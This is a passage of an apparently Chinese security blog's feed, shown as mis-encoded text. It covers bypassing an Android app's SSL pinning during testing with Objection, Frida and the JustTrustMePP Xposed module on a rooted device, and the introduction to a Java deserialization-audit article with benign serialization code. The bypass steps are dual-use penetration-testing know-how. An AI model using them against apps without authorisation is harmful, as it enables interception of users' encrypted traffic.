alt="image-20240319164556948"></a></p>]]></content>
      
      
      <categories>
          
          <category> SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMAP </tag>
            
            <tag> ORACLE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APPæµ‹è¯•ç³»åˆ—- APPæµ‹è¯•è¿‡ç¨‹æŠ“åŒ…å°é—®é¢˜è®°å½•</title>
      <link href="/2024/03/19/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-APP%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E6%8A%93%E5%8C%85%E5%B0%8F%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/03/19/APP%E6%B5%8B%E8%AF%95%E7%B3%BB%E5%88%97-APP%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E6%8A%93%E5%8C%85%E5%B0%8F%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>ç»§ç»­æ¥åŠ› APP çš„æµ‹è¯•ï¼Œè®°å½•æµ‹è¯•è¿‡ç¨‹ä¸­é‡åˆ°æŠ“åŒ…çš„å°é—®é¢˜ï¼Œç¯‡å¹…å¦‚ä¸‹ã€‚</p><h2 id="äºŒã€å…·ä½“é—®é¢˜"><a href="#äºŒã€å…·ä½“é—®é¢˜" class="headerlink" title="äºŒã€å…·ä½“é—®é¢˜"></a>äºŒã€å…·ä½“é—®é¢˜</h2><p>æµ‹è¯•åº”ç”¨ Android APPï¼Œå½“æ­£å¸¸ä½¿ç”¨ç³»ç»Ÿè®¾ç½® wifi ä»£ç†æ—¶ï¼Œè¿›å…¥ APP ç•Œé¢æç¤ºæŠ¥é”™ â€œè¯·æ±‚å¤±è´¥ï¼Œjava.security.cert.CertPathValidatorException:Trust anchor for certification path not foundâ€ï¼Œæ— æ³•æ­£å¸¸è¿›è¡ŒæŠ“åŒ…ã€‚æ ¹æ®æŠ¥é”™æç¤ºï¼Œå¤§æ¦‚çŸ¥é“æ˜¯è¯ä¹¦ç±»çš„é—®é¢˜ï¼Œå°è¯•ä½¿ç”¨ Objection ç»•è¿‡ SSLPinning æ— æ³•æŠ“å–æ•°æ®åŒ…ï¼ŒAPP æç¤º network errorã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/1.png" data-caption="1"><img src="/../images/mobile/xposed/https/1.png" alt="1"></a></p><p>ç»§ç»­å°è¯• frida è„šæœ¬ç»•è¿‡ï¼Œä½†æŠ¥é”™ syntax error,expect start with { or [,but actually start with errorï¼Œæç¤ºè¯­æ³•é”™è¯¯ï¼Œæ­¤å‰ä¸€ç›´ä½¿ç”¨è¯¥è„šæœ¬è¿›è¡Œæµ‹è¯•æ²¡æœ‰å‡ºç°è¿‡æ­¤ç±»çš„æŠ¥é”™ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/2.png" data-caption="2"><img src="/../images/mobile/xposed/https/2.png" alt="2"></a> </p><h2 id="ä¸‰ã€è§£å†³æ–¹æ¡ˆ"><a href="#ä¸‰ã€è§£å†³æ–¹æ¡ˆ" class="headerlink" title="ä¸‰ã€è§£å†³æ–¹æ¡ˆ"></a>ä¸‰ã€è§£å†³æ–¹æ¡ˆ</h2><p>åé¢ä½¿ç”¨å°é»„é¸Ÿå‘ç°å¯æŠ“åŒ…ï¼Œä½†ä¸ªäººä½¿ç”¨èµ·æ¥ä¸å¤ªé¡ºæ‰‹ï¼Œæœ€ç»ˆé€šè¿‡ç­›é€‰é€‰æ‹©ä½¿ç”¨ Xposed æ¡†æ¶ä¸­çš„ JustTrustMePP è¿›è¡Œç»•è¿‡ï¼Œé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/JunGe-Y/JustTrustMePP/blob/master/app/release/app-release.apk">https://github.com/JunGe-Y/JustTrustMePP/blob/master/app/release/app-release.apk</a></p><p>1ï¼‰æ‰‹æœºéœ€è¦ rootï¼Œç„¶åå®‰è£… Magisk v21+ï¼Œè¿™ä¸€æ­¥å°±ä¸å¤šè¯´äº†ï¼Œè‡ªè¡Œå‡†å¤‡è®¾å¤‡ï¼Œæœ¬äºº Magisk ç‰ˆæœ¬ä¸º 26.1ï¼Œç„¶åå®‰è£… Zygisk-LSPosed å®ç° Xposedï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://github.com/LSPosed/LSPosed">https://github.com/LSPosed/LSPosed</a> ï¼Œä¸‹è½½åç›´æ¥åœ¨æ¨¡å—å¤„é€‰æ‹©å®‰è£…åé‡å¯è®¾å¤‡å³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/xposed.jpg" data-caption="xposed"><img src="/../images/mobile/xposed/https/xposed.jpg" alt="xposed"></a></p><p>2ï¼‰å®‰è£…å®Œæ¯•åï¼Œåœ¨é€šçŸ¥æ ä¸­ä¼šå‡ºç° LSPosed ç®¡ç†å™¨ï¼Œç”¨äºç®¡ç† Xposed ä¸­çš„æ’ä»¶ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/3.png" data-caption="3"><img src="/../images/mobile/xposed/https/3.png" alt="3"></a></p><p>3ï¼‰å®‰è£…  JustTrustMePP.apk ï¼Œä¸‹è½½åœ°å€ï¼š<a href="https://github.com/JunGe-Y/JustTrustMePP/blob/master/app/release/app-release.apk">https://github.com/JunGe-Y/JustTrustMePP/blob/master/app/release/app-release.apk</a> ä¸‹è½½å®Œå®‰è£…å³å¯ï¼Œç„¶ååœ¨æ‰‹æœºé€šçŸ¥æ å¤„è¿›å…¥ LSPosed ç®¡ç†å™¨ç®¡ç†è¯¥æ’ä»¶ï¼Œè¿›å…¥  JustTrustMe++ é€‰æ‹©éœ€è¦ä½¿ç”¨è¯¥æ’ä»¶çš„ APP å³å¯ç»•è¿‡è¯ä¹¦éªŒè¯ï¼ŒæŠ“å– httpsã€‚</p><blockquote><p>è¯¥ JustTrustMePP ä¸»è¦è§£å†³çš„æ˜¯ç”¨äº†Okhttp ä¸”è¢«æ··æ·†çš„ appï¼Œé€šè¿‡ hook okhttp åœ¨éªŒè¯è¯ä¹¦ä¹‹å‰å¿…é¡»ç”¨åˆ°çš„ç±»ï¼Œç„¶åé€šè¿‡è¿™ä¸ªç±»çš„è°ƒç”¨å †æ ˆï¼Œå»è¯†åˆ« okhttp çš„ç›¸å…³ç±»ï¼Œä»è€Œå®ç°è·³è¿‡è¯ä¹¦éªŒè¯ã€‚</p></blockquote><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/4.png" data-caption="4"><img src="/../images/mobile/xposed/https/4.png" alt="4"></a></p><p><a data-fancybox="gallery" data-src="/../images/mobile/xposed/https/5.png" data-caption="5"><img src="/../images/mobile/xposed/https/5.png" alt="5"></a></p><h2 id="å››ã€åè®°"><a href="#å››ã€åè®°" class="headerlink" title="å››ã€åè®°"></a>å››ã€åè®°</h2><p>æµ‹è¯•å®Œæ¯•åè¿›è¡Œå¤ç›˜æ—¶ï¼Œå‘ç°å…¶ä¸­ä¸€è®¾å¤‡é‡æ–°ä½¿ç”¨ Objection åæƒŠå¥‡å‘ç°å¯ä»¥è¿›è¡Œç»•è¿‡æŠ“åŒ…ï¼Œå½“æ—¶æµ‹è¯•æœŸé—´ä½¿ç”¨äº†ä¸¤å°è®¾å¤‡ Objection å‡æ— æ³•ç»•è¿‡ï¼Œåªèƒ½è¯´å‘½è¿å¼„äººï¼Œæµ‹è¯•å®Œæ¯•æ‰æ­£å¸¸å¯æŠ“ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
          <category> ç§»åŠ¨å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æŠ“åŒ… </tag>
            
            <tag> Okhttp </tag>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡(å…«)-ååºåˆ—åŒ–æ¼æ´æ¡ˆä¾‹è°ƒè¯•åˆ†æ</title>
      <link href="/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"/>
      <url>/2024/03/18/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E5%85%AB)-%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>æœ¬æ–‡ä¸º Java ååºåˆ—åŒ–æ¼æ´æ¡ˆä¾‹è°ƒè¯•åˆ†æå­¦ä¹ æ–‡ç« ï¼Œä¸»è¦å†…å®¹ä¸ºé€šè¿‡å·²æŠ«éœ²çš„ä¿¡æ¯ç»“åˆ Poc å®šä½æ¼æ´åˆ©ç”¨é“¾å¹¶è¿›è¡Œå›æº¯åˆ†æï¼Œé‡æ€è·¯å‘ã€‚</p><h2 id="äºŒã€å‰ç½®çŸ¥è¯†"><a href="#äºŒã€å‰ç½®çŸ¥è¯†" class="headerlink" title="äºŒã€å‰ç½®çŸ¥è¯†"></a>äºŒã€å‰ç½®çŸ¥è¯†</h2><h3 id="Java-åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#Java-åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="Java åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>Java åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h3><p><code>Java åºåˆ—åŒ–</code> æ˜¯æŒ‡æŠŠ Java <code>å¯¹è±¡</code>è½¬æ¢ä¸º<code>å­—èŠ‚åºåˆ—</code>çš„è¿‡ç¨‹ï¼Œä¾¿äºä¿å­˜åœ¨å†…å­˜ã€æ–‡ä»¶ã€æ•°æ®åº“ä¸­ï¼Œå¦‚<code>ObjectOutputStream</code> ç±»çš„ <code>writeObject()</code> æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–ã€‚</p><p><code>Javaååºåˆ—åŒ–</code> æ˜¯æŒ‡æŠŠ<code>å­—èŠ‚åºåˆ—</code>æ¢å¤ä¸º Java <code>å¯¹è±¡</code> çš„è¿‡ç¨‹ï¼Œå¦‚<code>ObjectInputStream</code> ç±»çš„ <code>readObject()</code> æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚ç®€å•æ¡ˆä¾‹å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// å®šä¹‰objå¯¹è±¡</span></span><br><span class="line">        String obj=<span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªåŒ…å«å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ä¿¡æ¯çš„â€objectâ€æ•°æ®æ–‡ä»¶</span></span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object_test&quot;</span>);</span><br><span class="line">        ObjectOutputStream os=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        <span class="comment">// writeObject()æ–¹æ³•å°†objå¯¹è±¡å†™å…¥objectæ–‡ä»¶</span></span><br><span class="line">        os.writeObject(obj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡</span></span><br><span class="line">        FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object_test&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//æ¢å¤å¯¹è±¡</span></span><br><span class="line">        String obj2=(String)ois.readObject();</span><br><span class="line">        System.out.print(obj2);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230812153527991.png" data-caption="image-20230812153527991"><img src="/../images/Java/deserialization/image-20230812153527991.png" alt="image-20230812153527991"></a></p><blockquote><p>åºåˆ—åŒ–æ˜¯è®© Java å¯¹è±¡è„±ç¦» Java è¿è¡Œç¯å¢ƒçš„ä¸€ç§æ‰‹æ®µï¼Œå¯ä»¥æœ‰æ•ˆçš„å®ç°å¤šå¹³å°ä¹‹é—´çš„é€šä¿¡ã€å¯¹è±¡æŒä¹…åŒ–å­˜å‚¨ï¼š</p><p>1ï¼‰æŠŠå¯¹è±¡çš„å­—èŠ‚åºåˆ—æ°¸ä¹…åœ°ä¿å­˜åˆ°ç¡¬ç›˜ä¸Šï¼Œé€šå¸¸å­˜æ”¾åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼›<br>2ï¼‰åœ¨ç½‘ç»œä¸Šä¼ é€å¯¹è±¡çš„å­—èŠ‚åºåˆ—æ¥æ”¶æ–¹æ¥æ”¶åˆ°å­—ç¬¦åºåˆ—åï¼Œä½¿ç”¨ååºåˆ—åŒ–ä»å­—èŠ‚åºåˆ—ä¸­æ¢å¤å‡ºJavaå¯¹è±¡ï¼›</p></blockquote><h3 id="åºåˆ—åŒ–-x2F-ååºåˆ—åŒ–æ–¹æ³•"><a href="#åºåˆ—åŒ–-x2F-ååºåˆ—åŒ–æ–¹æ³•" class="headerlink" title="åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ–¹æ³•"></a>åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ–¹æ³•</h3><h4 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h4><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€writeObject() ï¼š ä¸º ObjectOutputStream ç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºå°†å¯¹è±¡åºåˆ—åŒ–å¹¶å†™å…¥è¾“å‡ºæµçš„å‡½æ•°ã€‚å®ƒæ˜¯åœ¨å®ç°äº† java.io.Serializable æ¥å£çš„ç±»ä¸­å®šä¹‰çš„ã€‚å½“ä½ è°ƒç”¨ writeObject() æ–¹æ³•å¹¶å°†ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒæ—¶ï¼Œè¯¥å¯¹è±¡çš„çŠ¶æ€å°†è¢«åºåˆ—åŒ–å¹¶å†™å…¥è¾“å‡ºæµä¸­ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ã€writeUnshared()ï¼šè¯¥æ–¹æ³•ä¸ writeObject() ç±»ä¼¼ï¼Œç”¨äºå°†å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–å¹¶å†™å…¥è¾“å‡ºæµä¸­ã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼ŒwriteUnshared() æ–¹æ³•ä¼šç¡®ä¿å¯¹è±¡çš„æ¯æ¬¡å†™å…¥éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œå³ä½¿åŒä¸€ä¸ªå¯¹è±¡å¤šæ¬¡å†™å…¥ï¼Œæ¯æ¬¡å†™å…¥éƒ½ä¼šè¢«è§†ä¸ºç‹¬ç«‹çš„å¯¹è±¡ã€‚è¿™å¯ä»¥ç”¨äºé¿å…åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å¼•å…¥å¯¹è±¡çš„å¾ªç¯å¼•ç”¨æˆ–å…±äº«çŠ¶æ€ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ã€XMLEncoderï¼šXMLEncoder ç±»ç”¨äºå°† Java å¯¹è±¡åºåˆ—åŒ–ä¸º XML æ ¼å¼çš„æ•°æ®ã€‚å®ƒå¯ä»¥å°† Java å¯¹è±¡å›¾è½¬æ¢ä¸º XML æ•°æ®ã€‚å¯ä»¥ä½¿ç”¨ XMLEncoder çš„æ„é€ å‡½æ•°åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œä¼ å…¥ä¸€ä¸ªè¾“å‡ºæµï¼ˆå¦‚æ–‡ä»¶è¾“å‡ºæµã€URL è¾“å‡ºæµç­‰ï¼‰ï¼Œç„¶åä½¿ç”¨ writeObject() æ–¹æ³•å°†å¯¹è±¡å†™å…¥è¾“å‡ºæµ</span><br></pre></td></tr></table></figure></div><h4 id="ååºåˆ—"><a href="#ååºåˆ—" class="headerlink" title="ååºåˆ—"></a>ååºåˆ—</h4><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€readObject()ï¼šä¸º ObjectInputStream ç±»ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºä»è¾“å…¥æµä¸­è¯»å–åºåˆ—åŒ–çš„å¯¹è±¡å¹¶è¿›è¡Œååºåˆ—åŒ–ã€‚å®ƒæ˜¯åœ¨å®ç°äº† java.io.Serializable æ¥å£çš„ç±»ä¸­å®šä¹‰çš„ã€‚å½“ä½ è°ƒç”¨ readObject() æ–¹æ³•æ—¶ï¼Œå®ƒä¼šä»è¾“å…¥æµä¸­è¯»å–å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ï¼Œå¹¶å°†å…¶è¿˜åŸä¸ºåŸå§‹å¯¹è±¡ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>ã€readUnshared()ï¼šè¯¥å‡½æ•°ä¸ readObject() ç±»ä¼¼ï¼Œç”¨äºä»è¾“å…¥æµä¸­è¯»å–åºåˆ—åŒ–çš„å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼ŒreadUnshared() å‡½æ•°ä¼šç¡®ä¿æ¯æ¬¡è¯»å–çš„å¯¹è±¡éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œå³ä½¿åŒä¸€ä¸ªå¯¹è±¡å¤šæ¬¡è¯»å–ï¼Œæ¯æ¬¡è¯»å–éƒ½ä¼šè¢«è§†ä¸ºç‹¬ç«‹çš„å¯¹è±¡ã€‚è¿™å¯ä»¥ç”¨äºé¿å…åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­å…±äº«å¯¹è±¡çŠ¶æ€ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>ã€XMLDecoderï¼šXMLDecoder ç±»ç”¨äºä» XML æ–‡ä»¶æˆ–è¾“å…¥æµä¸­è¯»å– XML æ•°æ®å¹¶å°†å…¶ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ã€‚å®ƒå¯ä»¥å°† XML æ•°æ®è½¬æ¢ä¸º Java å¯¹è±¡å›¾ã€‚å¯ä»¥ä½¿ç”¨ XMLDecoder çš„æ„é€ å‡½æ•°åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œä¼ å…¥ä¸€ä¸ªè¾“å…¥æµï¼ˆå¦‚æ–‡ä»¶è¾“å…¥æµã€URL è¾“å…¥æµç­‰ï¼‰ï¼Œç„¶åä½¿ç”¨ readObject() æ–¹æ³•ä»è¾“å…¥æµä¸­è¯»å–å¯¹è±¡</span><br></pre></td></tr></table></figure></div><blockquote><p>java.io.Serializable æ¥å£æ˜¯ Java ä¸­çš„ä¸€ä¸ªæ ‡è®°æ¥å£ï¼ˆmarker interfaceï¼‰ï¼Œç”¨äºæŒ‡ç¤ºç±»çš„å¯¹è±¡å¯ä»¥è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚å®ç°äº† Serializable æ¥å£çš„ç±»å¯ä»¥é€šè¿‡ ObjectOutputStream å°†å…¶å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµè¿›è¡Œåºåˆ—åŒ–ï¼Œå¹¶é€šè¿‡ ObjectInputStream å°†å­—èŠ‚æµè½¬æ¢å›å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ã€‚</p></blockquote><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"># SerializationExample ç±»ä¸­å®šä¹‰äº†ä¸¤ä¸ªæ–¹æ³• serializeObjectã€deserializeObject</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;serializedObject.ser&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">        serializeObject(fileName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–å¯¹è±¡</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> deserializeObject(fileName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ‰“å°ååºåˆ—åŒ–åçš„å¯¹è±¡ä¿¡æ¯</span></span><br><span class="line">        System.out.println(<span class="string">&quot;ååºåˆ—åŒ–å¯¹è±¡ï¼š&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;å§“åï¼š&quot;</span> + deserializedPerson.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;å¹´é¾„ï¼š&quot;</span> + deserializedPerson.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åºåˆ—åŒ–å¯¹è±¡ï¼Œå®šä¹‰ serializeObject æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeObject</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(fileName);</span><br><span class="line">             <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">25</span>);</span><br><span class="line">            objectOutputStream.writeObject(person);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;å¯¹è±¡åºåˆ—åŒ–æˆåŠŸ&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ååºåˆ—åŒ–å¯¹è±¡ï¼Œå®šä¹‰ deserializeObject æ–¹æ³•ï¼Œå¯¹è±¡ä¸º Person</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Person <span class="title function_">deserializeObject</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName);</span><br><span class="line">             <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) objectInputStream.readObject();</span><br><span class="line">            <span class="keyword">return</span> deserializedPerson;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ª Person ç±»å®ç° Serializable æ¥å£ï¼Œè¡¨ç¤ºè¯¥ç±»æ”¯æŒåºåˆ—åŒ–å’Œååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230812153747461.png" data-caption="image-20230812153747461"><img src="/../images/Java/deserialization/image-20230812153747461.png" alt="image-20230812153747461"></a></p><h2 id="ä¸‰ã€æ¼æ´æ¡ˆä¾‹"><a href="#ä¸‰ã€æ¼æ´æ¡ˆä¾‹" class="headerlink" 